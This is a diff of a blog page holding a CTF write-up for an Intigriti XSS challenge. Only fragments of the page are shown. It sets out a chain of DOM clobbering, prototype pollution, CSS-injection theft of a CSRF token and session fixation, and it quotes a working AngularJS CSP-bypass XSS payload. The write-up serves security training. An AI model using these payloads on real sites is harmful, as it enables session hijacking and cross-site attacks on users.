 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nameField<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>We can let <code>name</code> be <code>&quot;&gt;&lt;img name=cookie&gt;</code>, it’s 19 characters, just fits.</p>
 <p>After <code>document.domain</code> became a DOM element, <code>document.domain.match</code> will throw an error because there is no <code>match</code> method in DOM or in it’s prototype chain.</p>
 <p>Wait, did I say prototype chain?</p>
@@ -613,11 +630,11 @@
     <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Now, <code>document.domain.match(/testing/)</code> returns <code>&quot;1&quot;</code> which is truthy and <code>timeout</code> is <code>9999</code>, we can finally exploit CSS injection and steal the CSRF token.</p>
 <p>Part1 is about steal CSRF token to perform CSRF, part2 is about exploit nested parser vulnerability and find a CSP bypass to perform XSS.</p>
 <p>After finished both parts, we can build our full exploit script.</p>
-<h2><span id="full-exploit">Full Exploit</span></h2>
-<ol>
+<h2><span id="full-exploit">Full Exploit</span></h2><ol>
 <li>Login with the name <code>&quot;&gt;&lt;img name=domain&gt;</code> to do DOM clobbering</li>
 <li>Update theme to do prototype pollution</li>
 <li>Get CSRF token via CSS injection</li>
@@ -700,10 +717,10 @@
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Here is a working PoC: <a target="_blank" rel="noopener" href="https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html">https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html</a></p>
 <p>But the css injection server is a bit buggy, and I have no plan to maintain it, so I will shutdown the server in a week.</p>
-<h2><span id="bonus">Bonus</span></h2>
-<p>Besides stealing CSRF token, there is another tricky and a bit cheated way to do CSRF without stealing it.</p>
+<h2><span id="bonus">Bonus</span></h2><p>Besides stealing CSRF token, there is another tricky and a bit cheated way to do CSRF without stealing it.</p>
 <p>Since we have control over other sub domains, for example, <code>challenge-0422.intigriti.io</code>, we can use session fixation to fix session id and CSRF token.</p>
 <ol>
 <li>Get a session id and CSRF token from server, assumed it’s <code>sid123</code> and <code>token123</code></li>
@@ -755,9 +772,9 @@
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>I came up with this solution after the challenge started, and it shows how a sub-domain XSS can be abused to affect other sub-domain.</p>
-<h2><span id="another-bypass-with-angularjs-only">Another bypass with AngularJS only</span></h2>
-<p><a target="_blank" rel="noopener" href="https://twitter.com/kinugawamasato/status/1565146690470162432">@kinugawamasato</a> found another very coll way for the CSP bypass without any other library, here is the payload:</p>
+<h2><span id="another-bypass-with-angularjs-only">Another bypass with AngularJS only</span></h2><p><a target="_blank" rel="noopener" href="https://twitter.com/kinugawamasato/status/1565146690470162432">@kinugawamasato</a> found another very coll way for the CSP bypass without any other library, here is the payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;srcdoc&#x3D;
 &lt;script&#x2F;src&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.0.1&#x2F;angular.js&gt;&lt;&#x2F;script&gt;
 &lt;iframe&#x2F;ng-app&#x2F;ng-csp&#x2F;srcdoc&#x3D;&quot;
@@ -765,9 +782,9 @@
   &lt;&#x2F;script&gt;
   &lt;img&#x2F;ng-app&#x2F;ng-csp&#x2F;src&#x2F;ng-o&#123;&#123;&#125;&#125;n-error&#x3D;$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)&gt;&quot;
 &gt;&lt;&#x2F;iframe&gt;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>It uses nested AngularJS expression to bypass <code>on</code> keyword, and also use <code>$event.target.ownerDocument.defaultView</code> to access window, brilliant!</p>
-<h2><span id="credits">Credits</span></h2>
-<p>Bruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge.</p>
+<h2><span id="credits">Credits</span></h2><p>Bruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge.</p>
 <p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/Psych0tr1a">@Psych0tr1a</a> for his nested parser XSS research: <a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/">Fuzzing for XSS via nested parsers condition</a></p>
 <p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/Strellic_">@Strellic_</a> for his idea of chaining DOM clobbering and prototype pollution and share the writeup: <a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/UNI-CTF-21-complex-web-exploit-chain-0day-bypass-impossible-CSP">UNI CTF 2021: A Complex Web Exploit Chain &amp; a 0day to Bypass an Impossible CSP</a></p>
 <p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/tehjh">@tehjh</a> for his amazing <a target="_blank" rel="noopener" href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#191-bytes">CSP bypass via Angular</a></p>
